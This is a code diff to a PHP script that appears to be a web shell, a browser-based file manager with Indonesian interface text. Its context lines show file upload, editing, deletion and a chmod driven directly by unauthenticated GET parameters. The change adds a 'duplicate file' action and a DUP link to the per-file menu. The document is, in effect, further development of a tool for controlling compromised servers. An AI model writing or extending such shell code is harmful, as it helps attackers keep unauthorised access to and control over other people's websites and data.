@@ -76,6 +76,15 @@ if (isset($_FILES['u_file'])) {
         }
     }
 }
+if (isset($_GET['duplicate'])) {
+    $target = basename($_GET['duplicate']);
+    $newname = $target . "_copy";
+    if (@copy($target, $newname)) {
+        $msg = "File duplicated!";
+    } else {
+        $msg = "Duplication failed.";
+    }
+}
 if (isset($_GET['chmod']) && isset($_GET['file'])) {
     if (@chmod($_GET['file'], octdec($_GET['chmod']))) $msg = "Chmod Berhasil!";
 }
@@ -375,7 +384,7 @@ if (isset($_POST['s'])) {
         } else {
             $sz = round(@filesize($full) / 1024, 2) . " KB";
             echo "<td style='padding:5px;'>$i</td><td>$sz</td><td><span style='color:" . (is_writable($full) ? "#0f0" : "#f00") . ";'>$prm</span></td>
-        <td><a href='?path=$path&edit=$i'>EDIT</a> | <a href=\"$jsRename\">RENAME</a> | <a href='?path=$path&del=$i' onclick='return confirm(\"Hapus File?\")'>DEL</a> | <a href='javascript:void(0)' onclick='p=prompt(\"Chmod:\",\"$prm\");if(p)location.href=\"?path=$path&file=$i&chmod=\"+p'>CHMOD</a></td>";
+        <td><a href='?path=$path&edit=$i'>EDIT</a> | <a href=\"$jsRename\">RENAME</a> | <a href='?path=$path&del=$i' onclick='return confirm(\"Hapus File?\")'>DEL</a> | <a href='?path=$path&duplicate=$i'>DUP</a> | <a href='javascript:void(0)' onclick='p=prompt(\"Chmod:\",\"$prm\");if(p)location.href=\"?path=$path&file=$i&chmod=\"+p'>CHMOD</a></td>";
         }
         echo "</tr>";
     }
